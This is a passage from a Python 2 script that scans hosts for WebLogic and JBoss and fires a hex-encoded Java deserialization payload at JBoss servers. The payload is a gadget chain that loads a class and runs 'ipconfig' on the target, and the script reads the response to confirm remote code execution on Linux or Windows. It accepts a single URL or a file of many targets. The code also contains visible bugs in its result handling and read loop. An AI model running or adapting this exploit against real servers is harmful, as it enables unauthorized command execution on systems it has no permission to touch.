:00:00:00:01:75:72:00:12:5b:4c:6a:61:76:61:2e:6c:61:6e:67:2e:43:6c:61:73:73:3b:ab:16:d7:ae:cb:cd:5a:99:02:00:00:78:70:00:00:00:01:76:72:00:0f:5b:4c:6a:61:76:61:2e:6e:65:74:2e:55:52:4c:3b:52:51:fd:24:c5:1b:68:cd:02:00:00:78:70:74:00:0e:67:65:74:43:6f:6e:73:74:72:75:63:74:6f:72:75:71:00:7e:00:18:00:00:00:01:76:71:00:7e:00:18:73:71:00:7e:00:11:75:71:00:7e:00:16:00:00:00:01:75:71:00:7e:00:16:00:00:00:01:75:71:00:7e:00:1a:00:00:00:01:73:72:00:0c:6a:61:76:61:2e:6e:65:74:2e:55:52:4c:96:25:37:36:1a:fc:e4:72:03:00:07:49:00:08:68:61:73:68:43:6f:64:65:49:00:04:70:6f:72:74:4c:00:09:61:75:74:68:6f:72:69:74:79:71:00:7e:00:13:4c:00:04:66:69:6c:65:71:00:7e:00:13:4c:00:04:68:6f:73:74:71:00:7e:00:13:4c:00:08:70:72:6f:74:6f:63:6f:6c:71:00:7e:00:13:4c:00:03:72:65:66:71:00:7e:00:13:78:70:ff:ff:ff:ff:ff:ff:ff:ff:70:74:00:11:2f:63:3a:2f:77:69:6e:64:6f:77:73:2f:74:65:6d:70:2f:74:00:00:74:00:04:66:69:6c:65:70:78:74:00:0b:6e:65:77:49:6e:73:74:61:6e:63:65:75:71:00:7e:00:18:00:00:00:01:76:71:00:7e:00:16:73:71:00:7e:00:11:75:71:00:7e:00:16:00:00:00:01:74:00:0e:52:75:6e:43:68:65:63:6b:43:6f:6e:66:69:67:74:00:09:6c:6f:61:64:43:6c:61:73:73:75:71:00:7e:00:18:00:00:00:01:76:72:00:10:6a:61:76:61:2e:6c:61:6e:67:2e:53:74:72:69:6e:67:a0:f0:a4:38:7a:3b:b3:42:02:00:00:78:70:73:71:00:7e:00:11:75:71:00:7e:00:16:00:00:00:01:75:71:00:7e:00:18:00:00:00:01:71:00:7e:00:31:71:00:7e:00:1c:75:71:00:7e:00:18:00:00:00:01:71:00:7e:00:1e:73:71:00:7e:00:11:75:71:00:7e:00:16:00:00:00:01:75:71:00:7e:00:16:00:00:00:01:74:00:08:69:70:63:6f:6e:66:69:67:71:00:7e:00:28:75:71:00:7e:00:18:00:00:00:01:71:00:7e:00:2a:73:72:00:11:6a:61:76:61:2e:75:74:69:6c:2e:48:61:73:68:4d:61:70:05:07:da:c1:c3:16:60:d1:03:00:02:46:00:0a:6c:6f:61:64:46:61:63:74:6f:72:49:00:09:74:68:72:65:73:68:6f:6c:64:78:70:3f:40:00:00:00:00:00:0c:77:08:00:00:00:10:00:00:00:01:74:00:05:76:61:6c:75:65:71:00:7e:00:3d:78:78:76:72:00:1e:6a:61:76:61:2e:6c:61:6e:67:2e:61:6e:6e:6f:74:61:74:69:6f:6e:2e:52:65:74:65:6e:74:69:6f:6e:00:00:00:00:00:00:00:00:00:00:00:78:70"
        payload_3_windows=payload_3_windows.replace(":","").decode("hex")
        try:
            self.SendPayload(server,payload_1)
            self.SendPayload(server,payload_2)
            data_linux=self.SendPayload(server,payload_3_linux)
            data_windows=self.SendPayload(server,payload_3_windows)
        except Exception,e:
            print e
            print "Send payload false!"
            return False
        if com_ip.search(data_linux):
            print "Jboss JavaUnseriallize vulnerability!!!\nOS is Linux"
            return True
        if com_ip.search(data_windows):
            print "Jboss JavaUnseriallize vulnerability!!!\nOS is Windows"
            return True
        return False



def CheckGo(target):
    print "---------------Go Checking:"+target+"-------------"
    endstring="------------Checking Finished"+"------------"
    checkapp=CheckApp(target).Check(target)
    if checkapp==False:
        print endstring
        return False
    elif checkapp=="Weblogic":
        checkvulnerability=CheckVulnerability(target).CheckWeblogic(target)
        if checkvulnerability==True:
            print endstring
            return checkapp
        else:
            print endstring
            return False
    elif checkapp=="Jboss":
        checkvulnerability=CheckVulnerability(target).CheckJboss(target)
        if checkvulnerability==True:
            print endstring
            return checkapp
        else:
            print endstring
            return False


def main():
    result={"weblogic":[],"jboss":[]}
    if len(argv)>1:
        a=argv[1]
    else:
        try:
            a=raw_input("Enter staring URL(http://hotsname:port):")
        except:
            a=""
    if not a:
        return
    elif a[:7]=="http://":
        CheckGo(a.strip())
    else:
        try:
            f_target=open(a,"r")
            f_result=open("result.txt","w")
        except:
            print "Open File failed"
            return
        while True:
            l=f_target.readline().strip()
            result=CheckGo(l)
            if result==False:
                continue
            elif result=="Weblogic":
                result["weblogic"].append(l)
            elif result=="Jboss":
                result["jboss"].append(l)
        f_result.write(result)
        f_result.close()
        f_target.close()

if __name__=="__main__":
    main()



